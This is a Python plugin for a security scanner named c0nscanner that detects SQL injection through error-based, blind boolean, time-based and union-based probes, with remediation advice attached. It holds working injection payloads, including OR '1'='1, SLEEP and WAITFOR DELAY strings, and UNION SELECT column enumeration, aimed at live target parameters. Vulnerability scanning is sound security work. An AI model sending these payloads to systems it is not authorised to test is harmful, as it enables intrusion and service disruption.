"""sql injection scanner plugin for c0nscanner.

detects error-based, blind boolean, time-based, and union-based sqli.
"""

from __future__ import annotations

import asyncio
import re
import time

from c0nscanner.config import Config
from c0nscanner.core.http_engine import HTTPEngine, HTTPResponse
from c0nscanner.core.target import Target
from c0nscanner.plugins.base import BasePlugin, Finding
from c0nscanner.utils.helpers import random_boundary, hash_response


# common sql error patterns
SQL_ERRORS = [
    # mysql
    r"you have an error in your sql syntax",
    r"warning.*mysql",
    r"unclosed quotation mark",
    r"mysql_fetch",
    r"mysql_num_rows",
    r"mysql_query",
    r"mysqli_",
    r"com\.mysql\.jdbc",
    # postgresql
    r"pg_query",
    r"pg_exec",
    r"postgresql.*error",
    r"unterminated quoted string",
    r"syntax error at or near",
    # mssql
    r"microsoft.*odbc.*sql",
    r"microsoft.*oledb.*sql",
    r"\bOLE DB\b.*\bSQL Server\b",
    r"unclosed quotation mark after the character string",
    r"mssql_query",
    r"sql server.*error",
    # oracle
    r"ora-\d{5}",
    r"oracle.*error",
    r"oracle.*driver",
    r"quoted string not properly terminated",
    # sqlite
    r"sqlite.*error",
    r"sqlite3\.OperationalError",
    r"unrecognized token",
    r"near \".*\": syntax error",
    # generic
    r"sql syntax.*error",
    r"syntax error.*sql",
    r"invalid.*query",
    r"database error",
    r"db error",
    r"sql error",
    r"warning.*\Wmysql",
    r"valid mysql result",
    r"mysqlclient",
    r"supplied argument is not a valid",
]

SQL_ERROR_PATTERNS = [re.compile(p, re.IGNORECASE) for p in SQL_ERRORS]

# time-based delay threshold (seconds)
TIME_THRESHOLD = 4.5
TIME_PAYLOAD_DELAY = 5


class SQLiPlugin(BasePlugin):
    """sql injection vulnerability scanner."""

    name = "sqli"
    description = "sql injection detection (error/blind/time/union)"
    default_severity = "critical"

    async def scan(self, target: Target, http: HTTPEngine) -> list[Finding]:
        findings: list[Finding] = []

        if not target.is_parameterized:
            self.logger.debug(f"sqli: skipping {target.url} (no parameters)")
            return findings

        config = self._module_config
        techniques = config.get("techniques", ["error", "blind", "time", "union"])

        for param in target.param_names:
            if "error" in techniques:
                result = await self._test_error_based(target, param, http)
                if result:
                    findings.append(result)

            if "blind" in techniques:
                result = await self._test_blind_boolean(target, param, http)
                if result:
                    findings.append(result)

            if "time" in techniques:
                result = await self._test_time_based(target, param, http)
                if result:
                    findings.append(result)

            if "union" in techniques:
                result = await self._test_union_based(target, param, http)
                if result:
                    findings.append(result)

        return findings

    async def _test_error_based(
        self, target: Target, param: str, http: HTTPEngine
    ) -> Finding | None:
        """test for error-based sql injection."""
        error_payloads = ["'", '"', "`", "' OR '1'='1", "1' ORDER BY 1--"]

        for payload in error_payloads:
            url = target.with_payload(param, payload)
            resp = await http.get(url)

            if resp.error:
                continue

            for pattern in SQL_ERROR_PATTERNS:
                match = pattern.search(resp.body)
                if match:
                    return self.make_finding(
                        title=f"error-based sql injection in '{param}'",
                        url=target.url,
                        severity="critical",
                        parameter=param,
                        payload=payload,
                        evidence=f"sql error detected: {match.group(0)[:100]}",
                        remediation="use parameterized queries / prepared statements. "
                                    "never concatenate user input into sql queries.",
                        cvss=9.8,
                        references=[
                            "https://owasp.org/www-community/attacks/SQL_Injection",
                            "https://cwe.mitre.org/data/definitions/89.html",
                        ],
                    )

        return None

    async def _test_blind_boolean(
        self, target: Target, param: str, http: HTTPEngine
    ) -> Finding | None:
        """test for blind boolean-based sql injection."""
        # get baseline response
        baseline = await http.get(target.url)
        if baseline.error:
            return None

        baseline_hash = baseline.body_hash
        baseline_length = baseline.content_length

        # true condition
        true_url = target.with_payload(param, "' AND '1'='1")
        true_resp = await http.get(true_url)
        if true_resp.error:
            return None

        # false condition
        false_url = target.with_payload(param, "' AND '1'='2")
        false_resp = await http.get(false_url)
        if false_resp.error:
            return None

        # compare: true should match baseline, false should differ
        true_matches_baseline = (
            abs(true_resp.content_length - baseline_length) < 50
            or true_resp.body_hash == baseline_hash
        )
        false_differs = (
            abs(false_resp.content_length - baseline_length) > 50
            or false_resp.body_hash != baseline_hash
        )

        if true_matches_baseline and false_differs:
            # verify with numeric test
            true2_url = target.with_payload(param, "1 AND 1=1")
            true2_resp = await http.get(true2_url)
            false2_url = target.with_payload(param, "1 AND 1=2")
            false2_resp = await http.get(false2_url)

            if not true2_resp.error and not false2_resp.error:
                if abs(true2_resp.content_length - false2_resp.content_length) > 50:
                    return self.make_finding(
                        title=f"blind boolean-based sql injection in '{param}'",
                        url=target.url,
                        severity="high",
                        parameter=param,
                        payload="' AND '1'='1 / ' AND '1'='2",
                        evidence=f"response length differs: true={true_resp.content_length}, "
                                 f"false={false_resp.content_length}",
                        remediation="use parameterized queries / prepared statements.",
                        cvss=8.6,
                        references=[
                            "https://owasp.org/www-community/attacks/Blind_SQL_Injection",
                        ],
                    )

        return None

    async def _test_time_based(
        self, target: Target, param: str, http: HTTPEngine
    ) -> Finding | None:
        """test for time-based blind sql injection."""
        time_payloads = [
            f"'; WAITFOR DELAY '0:0:{TIME_PAYLOAD_DELAY}'--",
            f"'; SELECT SLEEP({TIME_PAYLOAD_DELAY})--",
            f"' AND SLEEP({TIME_PAYLOAD_DELAY})--",
            f"1; WAITFOR DELAY '0:0:{TIME_PAYLOAD_DELAY}'--",
            f"1' AND SLEEP({TIME_PAYLOAD_DELAY})--",
        ]

        for payload in time_payloads:
            url = target.with_payload(param, payload)
            start = time.monotonic()
            resp = await http.get(url)
            elapsed = time.monotonic() - start

            if resp.error:
                continue

            if elapsed >= TIME_THRESHOLD:
                # verify it wasn't just slow network
                normal_resp = await http.get(target.url)
                if normal_resp.elapsed < TIME_THRESHOLD / 2:
                    return self.make_finding(
                        title=f"time-based blind sql injection in '{param}'",
                        url=target.url,
                        severity="high",
                        parameter=param,
                        payload=payload,
                        evidence=f"response delayed by {elapsed:.1f}s "
                                 f"(baseline: {normal_resp.elapsed:.1f}s)",
                        remediation="use parameterized queries / prepared statements.",
                        cvss=8.6,
                        references=[
                            "https://owasp.org/www-community/attacks/Blind_SQL_Injection",
                        ],
                    )

        return None

    async def _test_union_based(
        self, target: Target, param: str, http: HTTPEngine
    ) -> Finding | None:
        """test for union-based sql injection by detecting column count."""
        # try ORDER BY to find column count
        for i in range(1, 21):
            url = target.with_payload(param, f"' ORDER BY {i}--")
            resp = await http.get(url)
            if resp.error:
                continue

            # if we get an error at column N, the table has N-1 columns
            error_found = any(p.search(resp.body) for p in SQL_ERROR_PATTERNS)
            if error_found and i > 1:
                cols = i - 1
                nulls = ",".join(["NULL"] * cols)
                union_url = target.with_payload(
                    param, f"' UNION SELECT {nulls}--"
                )
                union_resp = await http.get(union_url)

                if not union_resp.error and union_resp.status == 200:
                    # check that union query didn't cause an error
                    has_error = any(
                        p.search(union_resp.body) for p in SQL_ERROR_PATTERNS
                    )
                    if not has_error:
                        return self.make_finding(
                            title=f"union-based sql injection in '{param}' ({cols} columns)",
                            url=target.url,
                            severity="critical",
                            parameter=param,
                            payload=f"' UNION SELECT {nulls}--",
                            evidence=f"union injection with {cols} columns returned valid response",
                            remediation="use parameterized queries / prepared statements.",
                            cvss=9.8,
                            references=[
                                "https://owasp.org/www-community/attacks/SQL_Injection",
                            ],
                        )
                break

        return None
